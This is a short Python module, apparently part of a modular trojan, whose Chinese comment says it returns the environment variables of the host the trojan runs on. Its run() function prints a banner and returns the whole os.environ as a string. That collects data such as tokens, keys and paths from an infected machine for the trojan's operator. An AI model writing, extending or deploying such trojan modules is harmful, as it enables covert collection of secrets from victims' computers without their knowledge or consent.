#!/usr/bin/python3
#-*- coding: utf-8 -*-

import os

#返回木马所在主机的环境变量
def run(**kwargs):
    print('This is environment module')
    return str(os.environ)
